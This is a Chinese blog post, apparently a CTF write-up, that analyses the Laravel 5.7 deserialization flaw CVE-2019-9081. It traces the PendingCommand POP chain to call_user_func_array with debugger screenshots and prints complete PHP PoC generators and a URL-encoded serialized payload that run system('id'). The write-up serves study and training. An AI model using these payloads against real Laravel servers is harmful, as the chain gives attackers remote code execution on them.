<!DOCTYPE html>
<html lang=zh>
<head><meta name="generator" content="Hexo 3.9.0">
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="0x00 前言前天第五空间的时候5am3问我还会搞Laravel不。半年没打CTF了，真的是淡忘了很多，再加上当时牙疼到看着代码发蒙，所以题目中的链就给错过了。比赛之后复习了一下笔记📒。整合了其它笔记的内容，形成了这篇文章。PS: 反序列化漏洞POP链是我当时最喜欢搞得，没想到这知识忘得真的快啊。 0x01 判断题目环境的版本12❯ php artisanLaravel Framework 5.">
<meta property="og:type" content="article">
<meta property="og:title" content="Laravel 5.7反序列化漏洞(CVE-2019-9081+2020第五空间题解)">
<meta property="og:url" content="http://zer0yu.github.io/2020/06/28/Laravel-5-7反序列化漏洞-CVE-2019-9081-2020第五空间题解/index.html">
<meta property="og:site_name" content="Z3R0YU">
<meta property="og:description" content="0x00 前言前天第五空间的时候5am3问我还会搞Laravel不。半年没打CTF了，真的是淡忘了很多，再加上当时牙疼到看着代码发蒙，所以题目中的链就给错过了。比赛之后复习了一下笔记📒。整合了其它笔记的内容，形成了这篇文章。PS: 反序列化漏洞POP链是我当时最喜欢搞得，没想到这知识忘得真的快啊。 0x01 判断题目环境的版本12❯ php artisanLaravel Framework 5.">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://i.loli.net/2020/06/28/Z4j59vhtFQDcy3U.png">
<meta property="og:image" content="https://i.loli.net/2020/06/28/by7fIQELspNUPJt.png">
<meta property="og:image" content="https://i.loli.net/2020/06/28/YgOF1ZjoGQC72qx.png">
<meta property="og:image" content="https://i.loli.net/2020/06/28/8Smulv4HJPdDk5s.png">
<meta property="og:image" content="https://i.loli.net/2020/06/28/8nlj2XRaBCysz4v.png">
<meta property="og:image" content="https://i.loli.net/2020/06/28/26UT9BshukNJHCi.png">
<meta property="og:image" content="https://i.loli.net/2020/06/28/yGaVL2c6vEtHgj5.png">
<meta property="og:image" content="https://i.loli.net/2020/06/28/GSDoW6CO7ju5FRw.png">
<meta property="og:image" content="https://i.loli.net/2020/06/28/rymOvWD8LYzs4Kk.png">
<meta property="og:image" content="https://i.loli.net/2020/06/28/4vfwJAILg7Trt3X.jpg">
<meta property="og:image" content="https://i.loli.net/2020/06/28/BZt24oINVxg36iz.png">
<meta property="og:image" content="https://i.loli.net/2020/06/28/PnVRAUZWHGxfi27.png">
<meta property="og:image" content="https://i.loli.net/2020/06/28/RErawMfy9oPpqBS.png">
<meta property="og:updated_time" content="2020-06-28T00:19:48.431Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Laravel 5.7反序列化漏洞(CVE-2019-9081+2020第五空间题解)">
<meta name="twitter:description" content="0x00 前言前天第五空间的时候5am3问我还会搞Laravel不。半年没打CTF了，真的是淡忘了很多，再加上当时牙疼到看着代码发蒙，所以题目中的链就给错过了。比赛之后复习了一下笔记📒。整合了其它笔记的内容，形成了这篇文章。PS: 反序列化漏洞POP链是我当时最喜欢搞得，没想到这知识忘得真的快啊。 0x01 判断题目环境的版本12❯ php artisanLaravel Framework 5.">
<meta name="twitter:image" content="https://i.loli.net/2020/06/28/Z4j59vhtFQDcy3U.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>Laravel 5.7反序列化漏洞(CVE-2019-9081+2020第五空间题解)</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Z3R0YU" type="application/atom+xml">
    
</head>

<body class="max-width mx-auto px3 ltr">    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/About/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="https://github.com/zer0yu">Projects</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2020/08/11/When-TLS-Hacks-You-BlackHat2020/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2020/06/25/Gelato-Feedback-driven-and-Guided-Security-Analysis-of-Client-side-Web-Applications/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2020/06/28/Laravel-5-7反序列化漏洞-CVE-2019-9081-2020第五空间题解/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2020/06/28/Laravel-5-7反序列化漏洞-CVE-2019-9081-2020第五空间题解/&text=Laravel 5.7反序列化漏洞(CVE-2019-9081+2020第五空间题解)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2020/06/28/Laravel-5-7反序列化漏洞-CVE-2019-9081-2020第五空间题解/&title=Laravel 5.7反序列化漏洞(CVE-2019-9081+2020第五空间题解)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2020/06/28/Laravel-5-7反序列化漏洞-CVE-2019-9081-2020第五空间题解/&is_video=false&description=Laravel 5.7反序列化漏洞(CVE-2019-9081+2020第五空间题解)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Laravel 5.7反序列化漏洞(CVE-2019-9081+2020第五空间题解)&body=Check out this article: http://zer0yu.github.io/2020/06/28/Laravel-5-7反序列化漏洞-CVE-2019-9081-2020第五空间题解/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2020/06/28/Laravel-5-7反序列化漏洞-CVE-2019-9081-2020第五空间题解/&title=Laravel 5.7反序列化漏洞(CVE-2019-9081+2020第五空间题解)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2020/06/28/Laravel-5-7反序列化漏洞-CVE-2019-9081-2020第五空间题解/&title=Laravel 5.7反序列化漏洞(CVE-2019-9081+2020第五空间题解)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2020/06/28/Laravel-5-7反序列化漏洞-CVE-2019-9081-2020第五空间题解/&title=Laravel 5.7反序列化漏洞(CVE-2019-9081+2020第五空间题解)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2020/06/28/Laravel-5-7反序列化漏洞-CVE-2019-9081-2020第五空间题解/&title=Laravel 5.7反序列化漏洞(CVE-2019-9081+2020第五空间题解)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2020/06/28/Laravel-5-7反序列化漏洞-CVE-2019-9081-2020第五空间题解/&name=Laravel 5.7反序列化漏洞(CVE-2019-9081+2020第五空间题解)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-判断题目环境的版本"><span class="toc-number">2.</span> <span class="toc-text">0x01 判断题目环境的版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-设置对应的入口点"><span class="toc-number">3.</span> <span class="toc-text">0x02 设置对应的入口点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-本地环境搭建"><span class="toc-number">4.</span> <span class="toc-text">0x03 本地环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#A-本地环境配置"><span class="toc-number">4.1.</span> <span class="toc-text">A.本地环境配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#B-虚拟机环境配置"><span class="toc-number">4.2.</span> <span class="toc-text">B.虚拟机环境配置</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-CVE-2019-9081"><span class="toc-number">5.</span> <span class="toc-text">0x04 CVE-2019-9081</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-CVE-2019-9081的参考链接"><span class="toc-number">6.</span> <span class="toc-text">0x05 CVE-2019-9081的参考链接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-第五空间–laravel"><span class="toc-number">7.</span> <span class="toc-text">0x06 第五空间–laravel</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x07-第五空间laravel题解参考"><span class="toc-number">8.</span> <span class="toc-text">0x07 第五空间laravel题解参考</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Laravel 5.7反序列化漏洞(CVE-2019-9081+2020第五空间题解)
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Z3R0YU</span>
      </span>
      
    <div class="postdate">
        <time datetime="2020-06-28T00:18:36.000Z" itemprop="datePublished">2020-06-28</time>
    </div>


      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>前天第五空间的时候5am3问我还会搞Laravel不。半年没打CTF了，真的是淡忘了很多，再加上当时牙疼到看着代码发蒙，所以题目中的链就给错过了。比赛之后复习了一下笔记📒。整合了其它笔记的内容，形成了这篇文章。<br>PS: 反序列化漏洞POP链是我当时最喜欢搞得，没想到这知识忘得真的快啊。</p>
<h3 id="0x01-判断题目环境的版本"><a href="#0x01-判断题目环境的版本" class="headerlink" title="0x01 判断题目环境的版本"></a>0x01 判断题目环境的版本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">❯ php artisan</span><br><span class="line">Laravel Framework 5.7.28</span><br></pre></td></tr></table></figure>
<h3 id="0x02-设置对应的入口点"><a href="#0x02-设置对应的入口点" class="headerlink" title="0x02 设置对应的入口点"></a>0x02 设置对应的入口点</h3><p>入口URL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php/index?p=</span><br></pre></td></tr></table></figure></p>
<p>与入口点相关的文件：</p>
<ol>
<li><p>路由文件 <code>routes/web.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">'/index'</span>, <span class="string">'TaskController@index'</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>反序列化的入口点 <code>app/Http/Controllers/TaskController.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TaskController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">	 <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'p'</span>]))&#123;</span><br><span class="line">		 unserialize($_GET[<span class="string">'p'</span>]);</span><br><span class="line">	 &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="string">"There is an param names p (get)"</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="0x03-本地环境搭建"><a href="#0x03-本地环境搭建" class="headerlink" title="0x03 本地环境搭建"></a>0x03 本地环境搭建</h3><p>两种环境搭建方案</p>
<h4 id="A-本地环境配置"><a href="#A-本地环境配置" class="headerlink" title="A.本地环境配置"></a>A.本地环境配置</h4><p>操作系统：macOS<br>PHP版本：7.3.11<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">composer create-project laravel/laravel laravel57mac &quot;5.7.*&quot;</span><br><span class="line">cd laravel57mac</span><br><span class="line">php artisan serve --host=0.0.0.0 --port 8081</span><br></pre></td></tr></table></figure></p>
<h4 id="B-虚拟机环境配置"><a href="#B-虚拟机环境配置" class="headerlink" title="B.虚拟机环境配置"></a>B.虚拟机环境配置</h4><p>具体的环境配置过程参考：<a href="https://learnku.com/docs/laravel-development-environment/7.x/development-environment-macos/8443" target="_blank" rel="noopener">官方链接</a><br>虚拟环境的操作：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 虚拟机的启动</span><br><span class="line">cd ~/Homestead &amp;&amp; vagrant up</span><br><span class="line"># ssh登录虚拟机</span><br><span class="line">cd ~/Homestead &amp;&amp; vagrant ssh</span><br><span class="line"># ssh上去之后可以使用如下命令退出</span><br><span class="line">exit</span><br><span class="line"># 关闭 Homestead</span><br><span class="line">vagrant halt</span><br><span class="line"># 虚拟机删除</span><br><span class="line">vagrant destroy --force</span><br><span class="line"># 修改Homestead.yaml配置文件重新加载</span><br><span class="line">cd ~/Homestead &amp;&amp; vagrant up # 如果虚拟机是开启的则不需要执行这个命令</span><br><span class="line">vagrant provision</span><br></pre></td></tr></table></figure></p>
<p>xdebug远程调试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#开启xdebug</span><br><span class="line">sudo phpenmod xdebug</span><br><span class="line">#关闭xdebug</span><br><span class="line">sudo phpdismod xdebug</span><br><span class="line">#客户端调试脚本</span><br><span class="line">xphp path/to/script</span><br><span class="line">#xdebug的配置文件修改</span><br><span class="line">/etc/php/7.#/fpm/conf.d/20-xdebug.ini</span><br></pre></td></tr></table></figure></p>
<p>web服务器切换(ngnix和apache)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flip</span><br></pre></td></tr></table></figure></p>
<h3 id="0x04-CVE-2019-9081"><a href="#0x04-CVE-2019-9081" class="headerlink" title="0x04 CVE-2019-9081"></a>0x04 CVE-2019-9081</h3><p>影响版本：Laravel v5.7<br>漏洞核心：<code>Illuminate/Foundation/Testing/PendingCommand</code>类中的<code>__destruct</code>方法中调用了<code>run</code>方法，而<code>run</code>方法是用来<code>Execute the command</code>的。因此需要找到对应的POP链来完成RCE。<br>首先看一下<code>PendingCommand</code>类中的几个重要属性：<br><img src="https://i.loli.net/2020/06/28/Z4j59vhtFQDcy3U.png" alt="-w872"><br>其次看一下关键的<code>run</code>方法，这其中有两个位置的代码比较关键。一个是与代码执行直接相关的，另外一个是与到达代码执行位置相关的方法<code>mockConsoleOutput</code>。我们必须保证方法<code>mockConsoleOutput</code>可以正常执行完毕。<br><img src="https://i.loli.net/2020/06/28/by7fIQELspNUPJt.png" alt="-w1145"><br>所有接下来就看一下<code>mockConsoleOutput</code>方法。由于程序可以正常执行到166行的位置，所以对162行的代码就不需要进行进一步的分析。<br><img src="https://i.loli.net/2020/06/28/YgOF1ZjoGQC72qx.png" alt="-w893"><br>分析的关键在于166行的的属性遍历。要控制这个数组我们只需要找到一个<code>public function __get</code>魔术方法就好了。一搜一大把，这里我们选择<code>Faker/DefaultGenerator</code>类中的。<br><img src="https://i.loli.net/2020/06/28/8Smulv4HJPdDk5s.png" alt="-w1014"><br>到这里为止我们先写一个PoC来进行动态分析一下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">test</span>;</span><br><span class="line">        <span class="keyword">protected</span> $app;</span><br><span class="line">        <span class="keyword">protected</span> $command;</span><br><span class="line">        <span class="keyword">protected</span> $parameters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test, $app, $command, $parameters)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = $test;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = $app;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = $command;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($default = null)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = $default;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> <span class="title">function</span> <span class="title">__construct</span>()</span><br><span class="line">        &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> &#123;</span><br><span class="line">    $<span class="title">defaultgenerator</span> = <span class="title">new</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>(<span class="title">array</span>("1" =&gt; "1"));</span><br><span class="line">    $application = <span class="keyword">new</span> Illuminate\Foundation\Application();</span><br><span class="line">    $pendingcommand = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand($defaultgenerator, $application, <span class="string">'system'</span>, <span class="keyword">array</span>(<span class="string">'id'</span>));</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($pendingcommand));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>执行之后的结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A4%3A%22test%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Ba%3A1%3A%7Bi%3A1%3Bs%3A1%3A%221%22%3B%7D%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A0%3A%7B%7Ds%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A2%3A%22id%22%3B%7D%7D</span><br></pre></td></tr></table></figure></p>
<p>此时可以看到已经成功过了<code>vendor/laravel/framework/src/Illuminate/Foundation/Testing/PendingCommand.php</code>中的第166行的代码<br><img src="https://i.loli.net/2020/06/28/8nlj2XRaBCysz4v.png" alt="-w1078"><br>可以到达关键的136行代码处。<br><img src="https://i.loli.net/2020/06/28/26UT9BshukNJHCi.png" alt="-w1133"><br>但是再往下走的程序就会抛出异常，所以要对136处的代码进行详细的分析。<br><img src="https://i.loli.net/2020/06/28/yGaVL2c6vEtHgj5.png" alt="-w1077"><br>这种链式调用不太好看变量中的内容，所以我在136行之前补充几行代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$kclass = Kernel::class;</span><br><span class="line">$app = <span class="keyword">$this</span>-&gt;app[Kernel::class];</span><br></pre></td></tr></table></figure></p>
<p>动态调试的过程中可以看到<code>Kernel::class</code>中的值是<code>Illuminate\Contracts\Console\Kernel</code>。而对应的<code>$app = $this-&gt;app[Kernel::class];</code>代码在执行时会抛出异常，所以我们要跟进这个部分。继续跟进之后到达<code>vendor/laravel/framework/src/Illuminate/Container/Container.php</code>文件中。我在动态分析的时候发现<code>Illuminate\Container\Container</code>类中调用的是<code>Illuminate\Container\BoundMethod</code> 的 <code>call</code> 静态方法。还有别忘了<code>Illuminate\Foundation\Application</code>类继承的是 <code>Illuminate\Container\Container</code>类的call方法。所以我们要继续往下跟。<br><img src="https://i.loli.net/2020/06/28/GSDoW6CO7ju5FRw.png" alt="-w894"><br>继续跟进之后可以看到一个关键函数<code>call_user_func_array</code>。继续跟进 <code>getMethodDependencies</code> 函数。该函数返回的是 <code>$dependencies</code> 数组和 <code>$parameters</code> 的合并数据，其中<code>$dependencies</code>默认为空数组，而 <code>$parameters</code> 为可控数据。<br><img src="https://i.loli.net/2020/06/28/rymOvWD8LYzs4Kk.png" alt="-w1058"><br>再加上此处<code>$callback</code>的值就是我们可控的值<code>system</code>，因此此处的实际形式为<code>call_user_func_array(可控数据,可控数据)</code>，可以构成任意代码执行。最终构造的POP链如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">test</span>;</span><br><span class="line">        <span class="keyword">protected</span> $app;</span><br><span class="line">        <span class="keyword">protected</span> $command;</span><br><span class="line">        <span class="keyword">protected</span> $parameters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test, $app, $command, $parameters)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = $test;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = $app;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = $command;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($default = null)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = $default;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">instances</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($instances = [])</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;instances[<span class="string">'Illuminate\Contracts\Console\Kernel'</span>] = $instances;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">defaultgenerator</span> = <span class="title">new</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>(<span class="title">array</span>("1" =&gt; "1"));</span><br><span class="line">    $app = <span class="keyword">new</span> Illuminate\Foundation\Application();</span><br><span class="line">    $application = <span class="keyword">new</span> Illuminate\Foundation\Application($app);</span><br><span class="line">    $pendingcommand = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand($defaultgenerator, $application, <span class="string">'system'</span>, <span class="keyword">array</span>(<span class="string">'id'</span>));</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($pendingcommand));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
